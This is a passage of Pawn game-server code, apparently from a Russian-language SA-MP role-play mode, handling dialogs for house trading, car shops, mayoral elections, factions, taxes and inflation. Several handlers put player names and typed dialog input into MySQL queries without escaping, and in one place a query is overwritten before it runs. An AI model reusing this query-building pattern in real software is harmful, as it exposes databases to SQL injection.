			case 6: format(boordh,sizeof(boordh),"-2636.6792,1402.4634,906.4609,-2659.1587,1416.9315,906.2734,3,48,4");
			case 7: format(boordh,sizeof(boordh),"1204.7395,-13.8515,1000.9219,1214.1865,-12.9937,1000.9219,2,48,4");
			case 8: format(boordh,sizeof(boordh),"501.9752,-67.5652,998.7578,496.4381,-75.5758,998.7578,11,49,5");
			case 9: format(boordh,sizeof(boordh),"315.79,-143.50,999.5,314.01,-133.94,999.60,7,18,6"); // AMMO
			case 10: format(boordh,sizeof(boordh),"575.6171,-248.3069,1049.1847 , 578.0658,-277.6297,1052.7412,5,10,4"); // НОВЫЙ КЛУБ
			case 11: format(boordh,sizeof(boordh),"0.0,0.0,0.0,0.0,0.0,0.0,0,27,7"); // CTO
			}
			ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: ЦЕНА , НАЗВАНИЕ\n\nПРИМЕР: 140000, Винивуд", "Принять", "Отмена");
		}
	case D_ADDNED+5:
		{
			if(PlayerLogged[playerid] == 0) return true;
			if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
			if(TOTALATM >= MAXATM-2) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете больше устанавливать банкоматы!");
			if(GetPVarInt(playerid, "LoadATM") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже устанавливаете банкомат!");
			ShowPlayerDialog(playerid, D_ATM+9, 0, "Банкомат", "{FF6347}Вы хотите начать установку банкомата?", "Да", "Нет");
			return true;
		}
	case D_JOINHOUSE:
		{
			if(response)
			{
				new idx = GetPVarInt(playerid, "PlayerHouse");
				if(!strcmp(HouseInfo[idx][hOwner],"None",true))
				{
					if(PlayerInfo[playerid][pCash] < GetInflationPrice(HouseInfo[idx][hPrice])) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
					else
					{
						new house = 0;
						for(new i = 1; i <= TOTALHOUSE;i++)
						{
							if(!strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pSendername],true)) house++;
						}
						if(house != 0) return SendClientMessage(playerid, COLOR_GREY, YouHaveAtHome);
						PlayerInfo[playerid][pCash] -= GetInflationPrice(HouseInfo[idx][hPrice]);
						HouseInfo[idx][hBuyPrice] = GetInflationPrice(HouseInfo[idx][hPrice]);
						format(string, 32, "The house was bought");
						GameTextForPlayer(playerid, string, 3000, 5);
						new startmoney;
						if(!strcmp("E",HouseInfo[idx][hDiscript],true)) startmoney = 50;
						if(!strcmp("D",HouseInfo[idx][hDiscript],true)) startmoney = 100;
						if(!strcmp("C",HouseInfo[idx][hDiscript],true)) startmoney = 150;
						if(!strcmp("B",HouseInfo[idx][hDiscript],true)) startmoney = 200;
						if(!strcmp("A",HouseInfo[idx][hDiscript],true)) startmoney = 250;
						if(!strcmp("L",HouseInfo[idx][hDiscript],true)) startmoney = 300;
						HouseInfo[idx][hOplata] = startmoney;
						SendMes(playerid, COLOR_WHITE, "Вы купили дом за %i долларов. У вас осталось: %i долларов",GetInflationPrice(HouseInfo[idx][hPrice]), PlayerInfo[playerid][pCash]);
						SendMes(playerid, COLOR_LIGHTRED, "На домашнем балансе проплачен 1 час, рекомендуем вам пополнить счет");
						SendMes(playerid, COLOR_LIGHTRED, "Стоимость кварплаты для вашего дома будет составлять %d$ в час!",startmoney);
						strmid(HouseInfo[idx][hOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
						format(query, sizeof(query), "UPDATE "TABLE_HOUSE" SET hOwner = '%s', hOplata = 250, buyprice = %i WHERE id = '%d' LIMIT 1", HouseInfo[idx][hOwner], GetInflationPrice(HouseInfo[idx][hPrice]), idx);
						mysql_query(query);
						PlayerInfo[playerid][pSpawnChange] = 1;
						PlayerInfo[playerid][cLock]=1;
						LoadMyCar(playerid);
						SetPlayerPos(playerid,HouseInfo[idx][hExitx],HouseInfo[idx][hExity],HouseInfo[idx][hExitz]);
						SetPlayerInterior(playerid,HouseInfo[idx][hInt]);
						SetPlayerVirtualWorld(playerid,HouseInfo[idx][hVirtual]);
						Exchequer+=GetInflationPrice(HouseInfo[idx][hPrice]);
						format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
						mysql_query(query);
						UpdateHouse(idx);
						return true;
					}
				}
				else
				{
					if(HouseInfo[idx][hLock] == 1)
					{
						if(strcmp(PlayerInfo[playerid][pSendername], HouseInfo[idx][hOwner], true) == 0) ShowPlayerDialog(playerid, D_JOB+14, 0, "Дом", "Ваш дом закрыт\n\nВы хотите его открыть?", "Да", "Нет");
						format(string, 16, "~r~Locked");
						GameTextForPlayer(playerid, string, 5000, 1);
					}
					else
					{
						SetPlayerPos(playerid,HouseInfo[idx][hExitx],HouseInfo[idx][hExity],HouseInfo[idx][hExitz]);
						SetPlayerInterior(playerid,HouseInfo[idx][hInt]);
						SetPlayerVirtualWorld(playerid,HouseInfo[idx][hVirtual]);
					}
				}
			}
		}
	case D_SELLHOUSE:
		{
			if(response)
			{
				new i = GetPVarInt(playerid, "PlayerHouse");
				strmid(HouseInfo[i][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				HouseInfo[i][hLock] = 0;
				SetHouseStr(i, "hOwner", "None");
				HouseInfo[i][hOplata] = 0;
				SendMes(playerid, COLOR_LIGHTRED, "Вы продали свой дом государству за %d.",HouseInfo[i][hBuyPrice]);
				UpdateHouse(i);
				format(string, 32, "The house sold");
				PlayerInfo[playerid][pBank] += HouseInfo[i][hBuyPrice];
				GameTextForPlayer(playerid, string, 3000, 5);
				Exchequer-=HouseInfo[i][hBuyPrice] / 2;
				if(GetPVarInt(playerid,"PlayerCar") > 0)
				{
					DestroyVehicle(GetPVarInt(playerid,"PlayerCar"));
					DeletePVar(playerid,"PlayerCar");
				}
				format(query, 256, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
				format(query, sizeof(query), "UPDATE "TABLE_HOUSE" SET  hOwner = '%s', hLock = %d, hOplata = 0 WHERE id = %d LIMIT 1", HouseInfo[i][hOwner], HouseInfo[i][hLock], i);
				mysql_query(query);
			}
		}
	case D_SELLHOUSE+1:
		{
			if(response)
			{
				if(!IsPlayerConnected(HouseOffer[playerid])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
				if(PlayerLogged[HouseOffer[playerid]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
				if(GetMoney(playerid) < HousePrice[playerid])
				{
					SendMes(HouseOffer[playerid], COLOR_LIGHTBLUE, "У %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					HouseOffer[playerid] = 999;
					HousePrice[playerid] = 0;
					return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
				}
				GiveMoney(HouseOffer[playerid], HousePrice[playerid]);
				format(query, sizeof(query), "UPDATE "TABLE_HOUSE" SET hOwner = '%s', hLock = 1, hOplata = 0 WHERE id = '%d' LIMIT 1", sendername(HouseOffer[playerid]), GetPVarInt(playerid, "PlayerHouse"));
				mysql_query(query);
				format(query, sizeof(query), "UPDATE "TABLE_HOUSE" SET hOwner = '%s', hLock = 1, hOplata = 0 WHERE id = '%d' LIMIT 1", PlayerInfo[playerid][pSendername], GetPVarInt(HouseOffer[playerid], "PlayerHouse"));
				mysql_query(query);
				strmid(HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hOwner],PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
				strmid(HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hOwner],sendername(HouseOffer[playerid]), 0, strlen(sendername(HouseOffer[playerid])), MAX_PLAYER_NAME);
				HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hLock] = 1;
				HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hLock] = 1;
				HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hOplata] = 0;
				HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hOplata] = 0;
				SetPVarInt(playerid, "PlayerHouse", GetPVarInt(HouseOffer[playerid], "PlayerHouse"));
				SetPVarInt(HouseOffer[playerid], "PlayerHouse", GetPVarInt(playerid, "PlayerHouse"));
				SendMes(playerid, COLOR_LIGHTBLUE, "Вы обменялись домами с %s. Доплата: %d долларов", sendername(HouseOffer[playerid]),HousePrice[playerid]);
				SendMes(HouseOffer[playerid], COLOR_LIGHTBLUE, "Вы обменялись домами с %s.Ваша доплата: %d долларов", PlayerInfo[playerid][pSendername],HousePrice[playerid]);
				HouseOffer[playerid] = 999;
				HousePrice[playerid] = 0;
			}
			else SendMes(HouseOffer[playerid], COLOR_LIGHTBLUE, "%s отклонил предложение обменяться домами с вами", PlayerInfo[playerid][pSendername]);
		}
	case D_JOINCARS:
		{
			if(!response) return true;
			if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
			//if(PlayerInfo[playerid][cModel] != 462) return SendClientMessage(playerid, COLOR_GREY, YouHaveAnyCar);
			if(PlayerInfo[playerid][pLic][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет водительских прав!");
			InShop[playerid] = 1;
			veh[playerid]=CreateVehicle(carsC[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
			format(string,64,"~w~%s",VehicleNameS[carsC[pPressed[playerid]][0]-400]);
			TextDrawSetString(VehNazv[playerid],string);
			format(string,32,"~g~%d$",GetInflationPrice(carsC[pPressed[playerid]][1]));
			TextDrawSetString(VehCost[playerid],string);
			SetPosInShop(playerid);
			SetPlayerCameraPos(playerid,610.3172,-121.1384,997.9922);
			SetPlayerCameraLookAt(playerid,616.1683,-124.3003,997.9922);
		}
	case D_JOINCARS+1:
		{
			if(!response) return true;
			if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
			//if(PlayerInfo[playerid][cModel] != 462) return SendClientMessage(playerid, COLOR_GREY, YouHaveAnyCar);
			if(PlayerInfo[playerid][pLic][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет водительских прав!");
			InShop[playerid] = 2;
			veh[playerid]=CreateVehicle(carsB[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
			format(string,64,"~w~%s",VehicleNameS[carsB[pPressed[playerid]][0]-400]);
			TextDrawSetString(VehNazv[playerid],string);
			format(string,32,"~g~%d$",GetInflationPrice(carsB[pPressed[playerid]][1]));
			TextDrawSetString(VehCost[playerid],string);
			SetPosInShop(playerid);
			SetPlayerCameraPos(playerid,610.3172,-121.1384,997.9922);
			SetPlayerCameraLookAt(playerid,616.1683,-124.3003,997.9922);
		}
	case D_JOINCARS+2:
		{
			if(!response) return true;
			if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
			//if(PlayerInfo[playerid][cModel] != 462) return SendClientMessage(playerid, COLOR_GREY, YouHaveAnyCar);
			if(PlayerInfo[playerid][pLic][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет водительских прав!");
			InShop[playerid] = 3;
			veh[playerid]=CreateVehicle(carsA[pPressed[playerid]][0],616.1683,-124.3003,997.9922,101.9068,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
			format(string,64,"~w~%s",VehicleNameS[carsA[pPressed[playerid]][0]-400]);
			TextDrawSetString(VehNazv[playerid],string);
			format(string,32,"~g~%d$",GetInflationPrice(carsA[pPressed[playerid]][1]));
			TextDrawSetString(VehCost[playerid],string);
			SetPosInShop(playerid);
			SetPlayerCameraPos(playerid,610.3172,-121.1384,997.9922);
			SetPlayerCameraLookAt(playerid,616.1683,-124.3003,997.9922);
		}
	case D_PICK:
		{
			if(!response) return true;
			if(!strcmp(PlayerInfo[playerid][pSendername],PickName[listitem],true)) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь проголосовать за себя!");
			PickTime[listitem]++, SendMes(playerid, COLOR_BLUE, "Вы проголосовали за: %s", PickName[listitem]);
			format(PickTimes,128,"%d,%d,%d,%d,%d,%d,%d",PickTime[0],PickTime[1],PickTime[2],PickTime[3],PickTime[4],PickTime[5],PickTime[6]);
			format(query, sizeof(query), "UPDATE "TABLE_MAYOR" SET times='%s'",PickTimes);
			mysql_query(query);
			PlayerInfo[playerid][pPick] = 1;
		}
	case D_PICK+1:
		{
			if(!response) return true;
			format(string, 90, "Введите имя кандидата на слот номер №%i:", listitem);
			ShowPlayerDialog(playerid, D_PICK+2, 1, "Кандидат", string, "Принять", "Отмена");
			SetPVarInt(playerid, "NumberPick", listitem);
		}
	case D_PICK+2:
		{
			if(!response) { DeletePVar(playerid, "NumberPick"); return true; }
			new c = GetPVarInt(playerid, "NumberPick");
			if(sscanf(inputtext,"s[32]",PickName[c])) { format(string, 90, "Введите имя кандидата на слот номер №%i:", c); return ShowPlayerDialog(playerid, D_PICK+2, 1, "Кандидат", string, "Принять", "Отмена"); }
			format(PickNames, 256, "%s, %s, %s, %s, %s, %s, %s",PickName[0], PickName[1], PickName[2], PickName[3], PickName[4], PickName[5], PickName[6]);
			format(query, sizeof(query), "UPDATE "TABLE_MAYOR" SET Name = '%s'", PickNames);
			mysql_query(query);
			SendMes(playerid, COLOR_ORANGE, "Вы добавили в кандидаты: %s",PickName[c]);
			DeletePVar(playerid, "NumberPick");
		}
	case D_PICK+3:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(Pick == true) return SendClientMessage(playerid, COLOR_GREY, "В штате уже проходят выборы!");
					SendClientMessageToAll(0xBC331AFF, "Внимание! В штате начались выборы. Длительность 6 часов");
					PickDate = gettime()+21600;
					Pick = true;
					format(query, sizeof(query),"UPDATE "TABLE_MAYOR" SET pick ='1', name='None, None, None, None, None, None, None', times='0,0,0,0,0,0,0',time = %d", PickDate);
					mysql_query(query);
					for(new i = 0; i < 7; i++) { strmid(PickName[i],"None",0,strlen("None"),MAX_PLAYER_NAME); PickTime[i] = 0; }
				}
			case 1:
				{
					if(Pick == false) return SendClientMessage(playerid, COLOR_GREY, "В штате нет выборов!");
					SendClientMessageToAll(0xBC331AFF, "Внимание! Выборы отменены администратором сервера!");
					ResetPick();
				}
			case 2:
				{
					if(Pick == false) return SendClientMessage(playerid, COLOR_GREY, "В штате нет выборов!");
					new str[255],sttr[255];
					for(new i = 0; i <= 6; i++)
					{
						format(str,sizeof(str),"Слот №%i - %s\n",i, PickName[i]);
						strcat(sttr, str);
					}
					ShowPlayerDialog(playerid, D_PICK+1, 2, "Кандидаты", sttr,"Принять", "Отмена");
				}
			}
		}
	case D_INVITEFRAC:
		{
			new playerd = GetPVarInt(playerid, "PlayerInvite");
			if(response)
			{
				PlayerInfo[playerid][pMember] = PlayerInfo[playerd][pMember];
				SendMes(playerid,COLOR_BLUE,"Вы присоединились к организации \"%s\"",FracInfo[PlayerInfo[playerd][pMember]][fName]);
				SendMes(playerd,COLOR_BLUE,"%s принял предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerd][pMember]][fName]);
				PlayerInfo[playerid][pRank] = 1;
				PlayerInfo[playerid][pJob] = 0;
				SelectCharID[playerid] = PlayerInfo[playerid][pMember];
				SelectCharPlace[playerid] = 1;
				ClothesRound[playerid] = 2;
				SpawnPlayer(playerid);
				return true;
			}
			else SendMes(playerd,COLOR_BLUE,"%s отклонил предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerd][pLeader]][fName]);
			DeletePVar(playerid, "PlayerInvite");
		}
	case D_INVITEFRAC+1:
		{
			new playerd = GetPVarInt(playerid, "PlayerInvite");
			new member = GetPVarInt(playerid, "PlayerInviteAdmin");
			if(response)
			{
				PlayerInfo[playerid][pMember] = member;
				SendMes(playerd,COLOR_ORANGE,"%s принял предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[member][fName]);
				SendMes(playerid,COLOR_BLUE,"Вы присоединились к организации \"%s\"",FracInfo[member][fName]);
				PlayerInfo[playerid][pRank] = 1;
				PlayerInfo[playerid][pJob] = 0;
				SelectCharID[playerid] = PlayerInfo[playerid][pMember];
				SelectCharPlace[playerid] = 1;
				ClothesRound[playerid] = 2;
				SpawnPlayer(playerid);
				return true;
			}
			else SendMes(playerd,COLOR_ORANGE,"%s отклонил предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerd][pLeader]][fName]);
			DeletePVar(playerid, "PlayerInvite");
			DeletePVar(playerid, "PlayerInviteAdmin");
		}
	case D_INFL:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(InflationTime > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Установить уровень инфляции можно раз в 6 часов!");
					ShowPlayerDialog(playerid, D_INFL+1,1, "Инфляция", "Установите уровень инфляции в штате:", "Принять", "Отмена");
				}
			case 1: ShowPlayerDialog(playerid, D_INFL+3,1, "Налоги", "Установите уровень налогов в штате:", "Принять", "Отмена");
			case 2: ShowPlayerDialog(playerid, D_INFL+5, 1, "Зарплата", "Установите уровень зарплаты ЛСПД:","Принять","Отмена");
			case 3: ShowPlayerDialog(playerid, D_INFL+6, 1, "Зарплата", "Установите уровень зарплаты СФПД:","Принять","Отмена");
			case 4: ShowPlayerDialog(playerid, D_INFL+7, 1, "Зарплата", "Установите уровень зарплаты ФБР:","Принять","Отмена");
			case 5: ShowPlayerDialog(playerid, D_INFL+8, 1, "Зарплата", "Установите уровень зарплаты МЧС:","Принять","Отмена");
			case 6: ShowPlayerDialog(playerid, D_HOME+1, 1, "Запрпала", "Установите уровень зарплаты Зоны 51:", "Принять", "Отмена");
			}
		}
	case D_INFL+1:
		{
			new inflation;
			if(!response) return true;
			if(sscanf(inputtext,"i",inflation)) return ShowPlayerDialog(playerid, D_INFL+1,1, "Инфляция", "Установите уровень инфляции в штате:", "Принять", "Отмена");
			if(inflation > 100 || inflation < 30) return SendClientMessage(playerid, COLOR_GREY, "Уровень инфляции от 30 до 100!"),ShowPlayerDialog(playerid, D_INFL+1,1, "Инфляция", "Установите уровень инфляции в штате:", "Принять", "Отмена");
			if(inflation > Inflation+10 || inflation < Inflation-10) return SendClientMessage(playerid, COLOR_GREY, "Установить уровень инфляции можно не более 10 за раз!"),ShowPlayerDialog(playerid, D_INFL+1,1, "Инфляция", "Установите уровень инфляции в штате:", "Принять", "Отмена");
			Inflation = inflation;
			InflationTime = gettime()+21600;
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень инфляции: %d процентов", inflation);
			format(string, 128, "[A] %s установил новый уровень инфляции: %d процентов", PlayerInfo[playerid][pSendername],inflation);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET inflation = %d, inflationtime = %d",inflation, InflationTime);
			mysql_query(query);
		}
	case D_INFL+2:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: format(string, 64, "Уровень инфляции в штате: %d процентов", Inflation);
			case 1: format(string, 64, "Уровень налогов в штате: %d процентов", Tax);
			case 2: format(string, 256, "Уровень зарплаты:\n\n1. Мэрия %d процентов\n2. ЛСПД %d процентов\n3. СФПД %d процентов\n4. ФБР %d процентов\n5. МЧС %d процентов\n6. Зона 51 %i процентов" ,TaxFraction[1], TaxFraction[2], TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			case 3: format(string, 64, "Кол-во средств в казне мэрии: %d долларов", Exchequer);
			}
			ShowPlayerDialog(playerid, D_NULL, 0, "Узнать", string, "Закрыть", "");
		}
	case D_INFL+3:
		{
			new tax;
			if(!response) return true;
			if(sscanf(inputtext,"i",tax)) return ShowPlayerDialog(playerid, D_INFL+3,1,"Налоги", "Установите уровень налогов в штате", "Принять", "Отмена");
			if(tax > 30 || tax < 0) return SendClientMessage(playerid, COLOR_GREY, "Уровень налогов от 0 до 30!"),ShowPlayerDialog(playerid, D_INFL+3,1,"Налоги", "Установите уровень налогов в штате", "Принять", "Отмена");
			Tax = tax;
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень налогов: %d процентов", tax);
			format(string, 128, "[A] %s установил новый уровень налогов: %d процентов", PlayerInfo[playerid][pSendername],tax);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET tax=%d",tax);
			mysql_query(query);
		}
	case D_INFL+5:
		{
			new taxfraction;
			if(!response) return true;
			if(sscanf(inputtext, "i",taxfraction)) return ShowPlayerDialog(playerid, D_INFL+5, 1, "Зарплата", "Установите уровень зарплаты ЛСПД:","Принять","Отмена");
			if(taxfraction > 100 || taxfraction < 50) return SendClientMessage(playerid, COLOR_GREY, "Уровень зарплаты от 50 до 100!"),ShowPlayerDialog(playerid, D_INFL+5, 1, "Зарплата", "Установите уровень зарплаты ЛСПД:","Принять","Отмена");
			TaxFraction[2] = taxfraction;
			format(TaxFractions, 90, "%d, %d, %d, %d, %d, %d", TaxFraction[1],TaxFraction[2],TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень зарплаты ЛСПД: %d", TaxFraction[2]);
			format(string, 128, "[A] %s установил новый уровень зарплаты: %d процентов",PlayerInfo[playerid][pSendername],TaxFraction[2]);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET fraction='%s'",TaxFractions);
			mysql_query(query);
		}
	case D_INFL+6:
		{
			new taxfraction;
			if(!response) return true;
			if(sscanf(inputtext, "i",taxfraction)) return ShowPlayerDialog(playerid, D_INFL+6, 1, "Зарплата", "Установите уровень зарплаты СФПД:","Принять","Отмена");
			if(taxfraction > 100 || taxfraction < 50) return SendClientMessage(playerid, COLOR_GREY, "Уровень зарплаты от 50 до 100!"),ShowPlayerDialog(playerid, D_INFL+6, 1, "Зарплата", "Установите уровень зарплаты СФПД:","Принять","Отмена");
			TaxFraction[3] = taxfraction;
			format(TaxFractions, 90, "%d, %d, %d, %d, %d, %d", TaxFraction[1],TaxFraction[2],TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень зарплаты СФПД: %d", TaxFraction[3]);
			format(string, 128, "[A] %s установил новый уровень зарплаты: %d процентов",PlayerInfo[playerid][pSendername],TaxFraction[3]);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET fraction='%s'",TaxFractions);
			mysql_query(query);
		}
	case D_INFL+7:
		{
			new taxfraction;
			if(!response) return true;
			if(sscanf(inputtext, "i",taxfraction)) return ShowPlayerDialog(playerid, D_INFL+7, 1, "Зарплата", "Установите уровень зарплаты ФБР:","Принять","Отмена");
			if(taxfraction > 100 || taxfraction < 50) return SendClientMessage(playerid, COLOR_GREY, "Уровень зарплаты от 50 до 100!"),ShowPlayerDialog(playerid, D_INFL+7, 1, "Зарплата", "Установите уровень зарплаты ФБР:","Принять","Отмена");
			TaxFraction[4] = taxfraction;
			format(TaxFractions, 90, "%d, %d, %d, %d, %d, %d", TaxFraction[1],TaxFraction[2],TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень зарплаты ФБР: %d", TaxFraction[4]);
			format(string, 128, "[A] %s установил новый уровень зарплаты: %d процентов",PlayerInfo[playerid][pSendername],TaxFraction[4]);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET fraction='%s'",TaxFractions);
			mysql_query(query);
		}
	case D_INFL+8:
		{
			new taxfraction;
			if(!response) return true;
			if(sscanf(inputtext, "i",taxfraction)) return ShowPlayerDialog(playerid, D_INFL+8, 1, "Зарплата", "Установите уровень зарплаты МЧС:","Принять","Отмена");
			if(taxfraction > 100 || taxfraction < 50) return SendClientMessage(playerid, COLOR_GREY, "Уровень зарплаты от 50 до 100!"),ShowPlayerDialog(playerid, D_INFL+8, 1, "Зарплата", "Установите уровень зарплаты МЧС:","Принять","Отмена");
			TaxFraction[5] = taxfraction;
			format(TaxFractions, 90, "%d, %d, %d, %d, %d, %d", TaxFraction[1],TaxFraction[2],TaxFraction[3], TaxFraction[4], TaxFraction[5], TaxFraction[6]);
			SendMes(playerid, COLOR_YELLOW, "Установлен уровень зарплаты МЧС: %d", TaxFraction[5]);
			format(string, 128, "[A] %s установил новый уровень зарплаты: %d процентов",PlayerInfo[playerid][pSendername],TaxFraction[5]);
			SendAdminMessage(COLOR_LIGHTRED, string);
			format(query,sizeof(query), "UPDATE "TABLE_MAYOR" SET fraction='%s'",TaxFractions);
			mysql_query(query);
		}
	case D_WEATHER:
		{
			if(response)
			{
				switch (listitem)
				{
				case 0: SetWeather(1);
				case 1: SetWeather(2);
				case 2: SetWeather(3);
				case 3: SetWeather(4);
				case 4: SetWeather(5);
				case 5: SetWeather(6);
				case 6: SetWeather(7);
				case 7: SetWeather(8);
				case 8: SetWeather(9);
				case 9: SetWeather(10);
				}
				SendClientMessage(playerid, COLOR_ORANGE, "Погода установлена");
			}
		}
	case D_FRACMENU:
		{
			new playerd = GetPVarInt(playerid, "PlayerLeader");
			if(!response) { DeletePVar(playerid, "PlayerLeader"); return true; }
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(listitem+1 == F_MAYOR)  PlayerInfo[playerd][pRank] = 11;
			if(listitem+1 == F_ARMY) PlayerInfo[playerd][pRank] = 13;
			if(listitem+1 >= F_POLICE_LS && listitem+1 <= F_VAGOS || listitem+1 > F_ARMY) PlayerInfo[playerd][pRank] = 10;
			PlayerInfo[playerd][pLeader] = listitem+1;
			PlayerInfo[playerd][pMember] = listitem+1;
			PlayerInfo[playerd][pJob] = 0;
			SelectCharID[playerd] = listitem+1;
			SelectCharPlace[playerd] = 1;
			ClothesRound[playerd] = 2;
			PlayerInfo[playerid][pModel] = GetPlayerSkin(playerid);
			PlayerInfo[playerid][pChar] = GetPlayerSkin(playerid);
			if(PlayerInfo[playerd][pAdmin] == 0)
			{
				strmid(FracInfo[listitem+1][fLeader],sendername(playerd),0,strlen(sendername(playerd)),MAX_PLAYER_NAME);
				SetFractionStr(listitem+1, "leader", sendername(playerd));
				SendMes(playerid, COLOR_ORANGE, "Вы назначили %s руководить организацией: %s",sendername(playerd), FracInfo[listitem+1][fName]);
				SendMes(playerd, COLOR_BLUE, "Администратор %s назначил вас руководить организацией: %s", PlayerInfo[playerid][pSendername], FracInfo[listitem+1][fName]);
			}
			else
			{
				SendMes(playerid, COLOR_ORANGE, "Вы дали лидерку администратору %s на: %s",sendername(playerd), FracInfo[listitem+1][fName]);
				SendMes(playerd, COLOR_BLUE, "Администратор %s выдал вам статическую лидерку: %s.", PlayerInfo[playerid][pSendername], FracInfo[listitem+1][fName]);
				ResetWeapon(playerd);
			}
			SpawnPlayer(playerd);
			DeletePVar(playerid, "PlayerLeader");
		}
	case D_FRACMENU+1:
		{
			new playerd = GetPVarInt(playerid, "PlayerRank");
			if(!response) { DeletePVar(playerid, "PlayerRank"); return true; }
			if(PlayerInfo[playerid][pLeader] == 0)
			{
				if(PlayerInfo[playerd][pRank] > listitem+1 && FracInfo[PlayerInfo[playerid][pMember]][fHelper][3] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
				if(PlayerInfo[playerd][pRank] < listitem+1 && FracInfo[PlayerInfo[playerid][pMember]][fHelper][2] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
			}
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
			if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			if(PlayerInfo[playerd][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
			DeletePVar(playerid, "PlayerRank");
			PlayerInfo[playerd][pRank] = listitem+1;
			SendMes(playerd,COLOR_BLUE,"%s %s повысил/понизил ваш ранг. Сейчас вы: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername],FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
			SendMes(playerid,COLOR_BLUE,"Вы повысили/понизили ранг %s. Сейчас он/она: %s",sendername(playerd), FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
		}
	case D_FRACMENU+2:
		{
			new playerd = GetPVarInt(playerid, "PlayerRank");
			if(!response) { DeletePVar(playerid, "PlayerRank"); return true; }
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
